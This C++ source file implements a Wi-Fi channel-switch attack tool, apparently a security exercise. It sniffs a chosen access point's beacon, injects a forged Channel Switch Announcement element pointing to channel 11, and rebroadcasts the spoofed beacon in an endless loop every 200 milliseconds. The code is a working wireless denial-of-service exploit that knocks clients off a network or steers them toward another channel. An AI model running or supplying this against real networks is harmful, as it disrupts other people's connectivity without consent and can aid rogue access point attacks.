#include "mac.h"
#include "pch.h"
#include "handler.h"
#include "macframe.h"
#include "management.h"
#include "ie.h"
#include "radiotap.h"
#include "config.h"


void usage()
{
    std::cout << "Usage: ./csa <interface> <ap_mac> " << std::endl;
}

int check_args(int argc, char* argv[])
{
    if (argc != 3) {
        usage();
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}



int main(int argc, char* argv[]) {
    if (check_args(argc, argv) == EXIT_FAILURE) {
        return EXIT_FAILURE ;
    }
    //==========Config initialization==========

    Config config;
    config.interface = argv[1];
    config.ap_mac = Mac(argv[2]);

    //==========PCAP initialization==========

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = handle_init(config.interface.c_str(), errbuf);
    if(pcap == nullptr) 
    {
        return EXIT_FAILURE;
    }
    //=========Find target AP's beacon frame=========
    
    const u_char* packet;
    int total_packet_len;
    packet = find_target_beacon(pcap, &config, &total_packet_len);

    // RadioTap v
    ieee80211_radiotap_header* radiotap_header = (ieee80211_radiotap_header*) packet;
    size_t radiotap_len = radiotap_header->it_len;

    ieee80211_mac_header* mac_header = (ieee80211_mac_header*)(packet + radiotap_len);
    size_t mac_header_len = sizeof(ieee80211_mac_header); // TODO : MAC Header 길이 계산 (QoS, HT 등 옵션에 따라 달라질 수 있음)

    //=========Make CSA frame=========

    std::cout << "Current Channel: " << config.ap_current_channel << std::endl;
    int switchChannel = setSwitchChannel(config.ap_current_channel);
    channel_switch_announcement_ie csa_ie = create_channel_switch_announcement_ie(11, 0); // 11번 채널 고정

    //=========Parse beacon frame body=========
    beacon_frame_body* frame_body = (beacon_frame_body*)(packet + radiotap_len + mac_header_len);

    //Beacon Frame Body에서 IE 순회하면서 CSA IE 삽입할 위치 확인
    const uint8_t* ptr = packet + radiotap_len + mac_header_len + sizeof(beacon_frame_body);
    const uint8_t* end = packet + total_packet_len;
    const uint8_t* insert_pos = nullptr;

    while (ptr + 2 <= end) 
    {
        uint8_t tag = ptr[0];
        uint8_t len = ptr[1];

        if (ptr + 2 + len > end) break; 

        if (tag == ieee80211_IE::SSID) 
        { // SSIDs보다 뒤에 삽입해야하므로 SSID IE 발견 시점에서 삽입 위치 설정
            insert_pos = ptr + 2 + len; // "뒤"에 삽입
            break;
        }
        ptr += 2 + len;
    }

    //============================= 패킷 생성 =============================

    // 전체 길이 = 기존 + CSA IE
    int new_packet_len = total_packet_len + sizeof(csa_ie);

    // 새 버퍼 생성
    u_char* new_packet = new u_char[new_packet_len];

    // 앞부분 복사 
    // packet 시작 ~ insert_pos 전까지
    size_t front_len = insert_pos - packet;
    memcpy(new_packet, packet, front_len);

    // CSA 삽입
    memcpy(new_packet + front_len, &csa_ie, sizeof(csa_ie));

    //뒷부분 복사
    // insert_pos ~ 끝까지
    size_t back_len = total_packet_len - front_len;
    memcpy(new_packet + front_len + sizeof(csa_ie), insert_pos, back_len);


    //추가 디테일
    //TODO : RadioTap + Beacon 타임스탬프 설정

    //TODO : Beacon Interval 설정

    //TODO : SN 설정

    // 디버깅
    dump(new_packet, new_packet_len);

    // //=====================================================================

    // //============CSA 프레임 송신 ===========
    int cnt = 1;
    while (true)
    {
        int res = pcap_sendpacket(pcap, new_packet, new_packet_len);
        if (res != 0) {
            std::cerr << "pcap_sendpacket error: " << pcap_geterr(pcap) << std::endl;
        }
        else{
            std::cout << "Sent CSA frame to AP " << cnt << ": " << (std::string)config.ap_mac << " to switch to channel " << (int)csa_ie.new_channel_number << std::endl;
        }
        cnt++;
        usleep(200000); //1초마다 전송
    }

    delete[] new_packet;
    return 0;
}